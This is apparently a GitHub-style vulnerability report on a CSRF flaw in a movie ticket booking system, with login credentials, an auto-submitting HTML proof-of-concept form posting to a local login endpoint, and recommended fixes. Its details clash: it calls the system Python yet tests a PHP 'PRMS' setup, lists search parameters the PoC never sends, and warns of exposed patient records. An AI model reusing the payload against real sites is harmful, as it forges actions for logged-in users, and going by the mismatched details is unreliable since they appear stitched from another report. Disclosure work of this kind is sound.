#  CSRF Vulnerability Report in Online Movie Ticket Booking System in Python 

##  Summary

A **Cross-Site Request Forgery (CSRF)** vulnerability was identified in the `Login Page` of the Movie Booking system. This flaw allows an attacker to force an authenticated user to submit crafted POST data, resulting in unauthorized actions such as searching records without their knowledge.

---

##  Affected Endpoint

- **URL:** `[https://localhost:5000/]`
- **HTTP Method:** `POST`
- **Vulnerable Parameters:**
  - `pn`
  - `search`
- **Authentication Required:**  Yes
- **CSRF Protection:**  None observed

---

##  Steps to Reproduce

### 1. Login as an Authenticated User

- Navigate to: `https://localhost/PRMS-php/`

Username: manager

Password: Password@123
![image](https://github.com/user-attachments/assets/1b12fe54-c58a-4869-ab5b-c3ea91b1d6e4)

### 2. Use the CSRF Proof-of-Concept

Save the following HTML as `csrf_poc.html`:

```html
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="http://127.0.0.1:5000/login" method="POST">

      <input type="hidden" name="username" value="manager" />

      <input type="hidden" name="password" value="Password&#64;123" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/');

      document.forms[0].submit();

    </script>

  </body>

</html>
```
![image](https://github.com/user-attachments/assets/8973199b-3b4d-49cb-abda-3f61175d9666)


### 3.  Trigger the CSRF Attack

- Open the file `csrf_poc.html` in a browser where the victim is already logged in.
- The form auto-submits and sends the forged request.
- The backend processes the request and responds with matching records.

---

##  Technical Evidence

###  HTTP Request Sent by PoC

![image](https://github.com/user-attachments/assets/aa2a84d4-4904-4033-bbe1-8832f7e3a28c)

###  Response
![image](https://github.com/user-attachments/assets/43106c0d-53ac-4746-b43d-7f7ef4938b5b)

 This confirms that the request was accepted and executed successfully without any CSRF protection or user interaction.

##  Impact

Attackers can craft a malicious web page that performs actions on behalf of logged-in users.

Could lead to:

- Unauthorized searches  
- Viewing of patient records  
- Escalated attacks if other endpoints like `edit`, `delete`, or `upload` also lack CSRF protection

This poses a risk to the **confidentiality** and **integrity** of the system.

---

##  Recommended Fixes

1. **Implement CSRF Tokens**  
   Use secure, random CSRF tokens for every authenticated form and validate them server-side.

2. **Set SameSite Cookies**  
   Use `SameSite=Strict` or `SameSite=Lax` on session cookies to prevent cross-origin submission.

3. **Validate Headers**  
   Check the `Origin` and `Referer` headers for all sensitive POST requests and reject unexpected sources.

4. **Use Frameworks with CSRF Protection**  
   Modern web frameworks like **Laravel**, **Django**, or **Spring** offer built-in CSRF protections â€” enable them.

---

## Author

- **Name:** VANSH Dhawan And Subhash Paudel  
- **Date of Discovery:** 28 June 2025  
- **Tools Used:** Burp Suite Professional, Firefox, HTML PoC  
- **Test Environment:** Localhost PRMS Setup (PHP-based)

   
